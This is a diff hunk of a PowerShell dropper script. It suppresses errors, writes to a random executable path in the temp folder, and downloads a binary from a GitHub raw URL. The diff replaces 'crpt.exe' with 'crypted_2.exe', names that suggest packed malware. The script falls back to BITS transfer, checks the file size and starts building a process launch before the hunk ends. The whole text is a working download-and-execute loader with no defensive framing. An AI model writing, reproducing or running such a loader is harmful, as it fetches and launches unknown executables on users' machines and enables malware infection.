@@ -1,7 +1,7 @@
 $ErrorActionPreference='SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol=3072
 $p=Join-Path $env:TEMP ('{0}.exe' -f (Get-Random))
-$u='https://raw.githubusercontent.com/iendjd7-lgtm/-RebelGuyy/refs/heads/main/crpt.exe'
+$u='https://github.com/iendjd7-lgtm/-RebelGuyy/raw/refs/heads/main/crypted_2.exe'
 try{(New-Object Net.WebClient).DownloadFile($u,$p)}catch{Start-BitsTransfer -Source $u -Destination $p}
 if((Test-Path $p) -and (Get-Item $p).Length -gt 100000){
  $i=New-Object Diagnostics.ProcessStartInfo
